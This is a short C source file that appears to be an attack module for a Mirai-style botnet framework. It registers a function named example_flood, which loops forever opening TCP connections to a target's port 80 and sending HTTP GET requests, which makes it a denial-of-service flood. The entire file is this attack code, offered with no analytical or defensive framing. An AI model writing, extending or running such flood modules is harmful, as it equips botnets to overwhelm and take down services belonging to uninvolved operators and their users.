#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdint.h>

typedef uint32_t ipv4_t;

typedef struct {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
} attack_target_t;

typedef struct {
    char key[256];
    char val[256];
} attack_option_t;

typedef void (*register_method_f)(uint8_t vector, void (*)(uint8_t, attack_target_t *, uint8_t, attack_option_t *), const char *name);

static void example_flood(uint8_t targs_len, attack_target_t *targs,
                          uint8_t opts_len, attack_option_t *opts)
{
    (void)targs_len; (void)opts_len; (void)opts;
    for (;;) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = targs[0].addr;
        sin.sin_port = htons(80);
        connect(fd, (struct sockaddr *)&sin, sizeof(sin));
        const char *req = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n";
        send(fd, req, strlen(req), 0);
        close(fd);
    }
}

void module_init(register_method_f register_method)
{
    register_method(0, example_flood, "example");
}
